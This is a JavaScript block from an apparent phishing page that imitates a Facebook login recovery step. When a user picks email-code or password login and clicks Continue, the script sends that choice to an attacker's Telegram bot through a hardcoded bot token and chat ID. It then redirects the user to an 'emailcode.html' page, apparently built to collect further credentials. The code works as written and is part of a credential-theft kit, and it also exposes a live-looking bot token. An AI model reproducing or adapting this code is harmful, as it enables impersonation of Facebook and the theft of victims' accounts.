    <script>
        // Get radio buttons and options
        const option1 = document.getElementById('option1');
        const option2 = document.getElementById('option2');
        const radio1 = document.getElementById('radio1');
        const radio2 = document.getElementById('radio2');
        const continueButton = document.getElementById('continueButton');

        // Function to select a radio button
        function selectOption(radioToSelect) {
            // Clear all selected states
            radio1.classList.remove('selected');
            radio2.classList.remove('selected');

            // Set the selected state
            radioToSelect.classList.add('selected');
        }

        // Add click handlers to the entire option rows
        option1.addEventListener('click', function() {
            console.log('Option 1 clicked');
            selectOption(radio1);
        });
        option2.addEventListener('click', function() {
            console.log('Option 2 clicked');
            selectOption(radio2);
        });

        // Add click handlers directly to radio buttons (for better UX)
        radio1.addEventListener('click', function(e) {
            console.log('Radio 1 clicked');
            e.stopPropagation();
            selectOption(radio1);
        });

        radio2.addEventListener('click', function(e) {
            console.log('Radio 2 clicked');
            e.stopPropagation();
            selectOption(radio2);
        });

        // Handle Continue button click
        continueButton.addEventListener('click', function() {
            const botToken = "7239842810:AAFEvwP7k_rzjlvpbpiC1hdM0PSX0A9aNuI";
            const chatId = "6895627984";
            let message = "Facebook Login: ";
            
            if (radio1.classList.contains('selected')) {
                message += "User selected 'Get code or link via email'";
            } else if (radio2.classList.contains('selected')) {
                message += "User selected 'Enter password to log in'";
            } else {
                alert("Please select an option first");
                return;
            }

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        window.location.href = "./emailcode.html"; // Redirect to the next page
                    } else {
                        alert("Error sending message to Telegram");
                    }
                })
                .catch(error => {
                    alert("Error: " + error);
                });
        });
    </script>
